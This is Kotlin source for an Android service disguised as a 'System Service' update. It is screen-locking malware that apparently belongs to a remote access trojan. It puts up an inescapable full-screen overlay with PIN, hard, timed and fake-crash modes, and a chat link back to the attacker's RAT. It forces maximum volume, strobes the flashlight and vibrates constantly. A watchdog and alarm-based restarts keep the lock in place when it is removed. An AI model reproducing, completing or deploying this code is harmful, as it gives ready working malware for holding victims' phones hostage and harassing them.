package com.system.update

import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.VideoView
import androidx.core.app.NotificationCompat

class LockService : Service() {

    companion object {
        const val NOTIF_ID = 100
        const val PREFS = "exoid_lock_prefs"

        @Volatile var currentOverlay: View? = null
        @Volatile var currentType: String? = null
        @Volatile var currentPin: String = "1234"
        @Volatile var currentHours: Long = 5L
        @Volatile var videoUrl: String? = null
        @Volatile var audioUrl: String? = null
        @Volatile var lockUntil: Long = 0L
        @Volatile var isActive: Boolean = false
    }

    private lateinit var wm: WindowManager
    private lateinit var prefs: SharedPreferences
    private var watchdog: Handler? = null
    private var mediaPlayer: MediaPlayer? = null
    private var videoView: VideoView? = null

    private var flashThread: Thread? = null
    private var vibrateThread: Thread? = null
    @Volatile private var flashRunning = false
    @Volatile private var vibrateRunning = false

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra("type")
        if (type == "stop") {
            clearState()
            stopLock()
            return START_NOT_STICKY
        }

        val finalType = type ?: prefs.getString("type", null)

        if (finalType != null) {
            currentType = finalType
            currentPin = intent?.getStringExtra("pin") ?: prefs.getString("pin", "1234") ?: "1234"
            currentHours = intent?.getLongExtra("hours", 0L) ?: prefs.getLong("hours", 5L)
            videoUrl = intent?.getStringExtra("videoUrl") ?: prefs.getString("videoUrl", null)
            audioUrl = intent?.getStringExtra("audioUrl") ?: prefs.getString("audioUrl", null)

            if (finalType == "time") {
                val stored = prefs.getLong("lockUntil", 0L)
                lockUntil = if (stored > 0) stored else System.currentTimeMillis() + currentHours * 3600_000L
                if (System.currentTimeMillis() >= lockUntil) {
                    clearState()
                    return START_NOT_STICKY
                }
            }

            saveState()
        }

        startForeground(NOTIF_ID, buildNotification())
        isActive = true

        if (currentType != null && currentOverlay == null) {
            showOverlay()
        }

        setVolumeMax()
        startFlashSpam()
        startVibrateSpam()
        startWatchdog()
        return START_STICKY
    }

    private fun setVolumeMax() {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
        } catch (_: Exception) {}
    }

    private fun startFlashSpam() {
        if (flashRunning) return
        flashRunning = true
        flashThread = Thread {
            try {
                val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                while (flashRunning) {
                    val id = cm.cameraIdList.firstOrNull { camId ->
                        cm.getCameraCharacteristics(camId)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } ?: break
                    try { cm.setTorchMode(id, true) } catch (_: Exception) {}
                    Thread.sleep(120)
                    try { cm.setTorchMode(id, false) } catch (_: Exception) {}
                    Thread.sleep(120)
                }
            } catch (_: Exception) {}
        }
        flashThread?.start()
    }

    private fun stopFlashSpam() {
        flashRunning = false
        try { flashThread?.interrupt() } catch (_: Exception) {}
        flashThread = null
    }

    private fun startVibrateSpam() {
        if (vibrateRunning) return
        vibrateRunning = true
        vibrateThread = Thread {
            try {
                val vm = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                while (vibrateRunning) {
                    try {
                        if (Build.VERSION.SDK_INT >= 26) {
                            vm.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION") vm.vibrate(500)
                        }
                        Thread.sleep(700)
                    } catch (_: Exception) { break }
                }
            } catch (_: Exception) {}
        }
        vibrateThread?.start()
    }

    private fun stopVibrateSpam() {
        vibrateRunning = false
        try { vibrateThread?.interrupt() } catch (_: Exception) {}
        vibrateThread = null
    }

    private fun saveState() {
        try {
            prefs.edit()
                .putString("type", currentType)
                .putString("pin", currentPin)
                .putLong("hours", currentHours)
                .putString("videoUrl", videoUrl)
                .putString("audioUrl", audioUrl)
                .putLong("lockUntil", lockUntil)
                .apply()
        } catch (_: Exception) {}
    }

    private fun clearState() {
        try { prefs.edit().clear().apply() } catch (_: Exception) {}
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun showOverlay() {
        try {
            removeOverlayView()

            val chatCallback: (String) -> Unit = { text ->
                try {
                    RatService.instance?.sendChatFromTarget(text)
                } catch (_: Exception) {}
            }

            val baseView: View = when (currentType) {
                "pin" -> LockOverlayView.buildPin(this, currentPin, { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    clearState()
                    stopLock()
                }, chatCallback)
                "hard" -> LockOverlayView.buildHard(this, chatCallback)
                "time" -> LockOverlayView.buildTimer(this, currentHours * 3600_000L, { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    clearState()
                    stopLock()
                }, chatCallback)
                "crash" -> LockOverlayView.buildCrash(this) { v ->
                    removeOverlayView()
                    v.let { try { wm.removeView(it) } catch (_: Exception) {} }
                    clearState()
                    stopLock()
                }
                else -> return
            }

            val root: View = if (!videoUrl.isNullOrEmpty()) {
                wrapWithVideo(baseView)
            } else {
                baseView
            }

            wm.addView(root, LockOverlayView.paramsFull())
            currentOverlay = root

            if (!audioUrl.isNullOrEmpty()) {
                startAudioLoop(audioUrl!!)
            }
        } catch (_: Exception) {}
    }

    private fun wrapWithVideo(contentView: View): View {
        val container = FrameLayout(this)

        try {
            val vv = VideoView(this)
            val uri = Uri.parse(videoUrl)
            vv.setVideoURI(uri)
            vv.setOnPreparedListener { mp ->
                mp.isLooping = true
                mp.setVolume(0f, 0f)
                vv.start()
            }
            vv.setOnErrorListener { _, _, _ -> true }

            val vvParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            vvParams.gravity = Gravity.CENTER
            container.addView(vv, vvParams)
            videoView = vv
        } catch (_: Exception) {}

        val contentParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        )
        container.addView(contentView, contentParams)

        return container
    }

    private fun startAudioLoop(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@LockService, Uri.parse(url))
                isLooping = true
                setVolume(1f, 1f)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> true }
                prepareAsync()
            }
        } catch (_: Exception) {}
    }

    private fun removeOverlayView() {
        try { currentOverlay?.let { wm.removeView(it) } } catch (_: Exception) {}
        currentOverlay = null

        try {
            videoView?.stopPlayback()
            videoView = null
        } catch (_: Exception) {}

        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
        } catch (_: Exception) {}
    }

    private fun startWatchdog() {
        watchdog?.removeCallbacksAndMessages(null)
        watchdog = Handler(Looper.getMainLooper())
        watchdog?.postDelayed(object : Runnable {
            override fun run() {
                if (!isActive) return

                if (currentType == "time" && lockUntil > 0 &&
                    System.currentTimeMillis() >= lockUntil) {
                    clearState()
                    stopLock()
                    return
                }

                if (currentOverlay == null && currentType != null) {
                    showOverlay()
                }

                watchdog?.postDelayed(this, 1500)
            }
        }, 1500)
    }

    fun stopLock() {
        isActive = false
        removeOverlayView()
        stopFlashSpam()
        stopVibrateSpam()
        currentType = null
        lockUntil = 0
        videoUrl = null
        audioUrl = null

        watchdog?.removeCallbacksAndMessages(null)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION") stopForeground(true)
        }
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        if (isActive) {
            try {
                val restart = Intent(applicationContext, LockService::class.java)
                val pi = PendingIntent.getService(
                    this, 1, restart,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
                val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
            } catch (_: Exception) {}
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        watchdog?.removeCallbacksAndMessages(null)
        removeOverlayView()
        stopFlashSpam()
        stopVibrateSpam()
        isActive = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}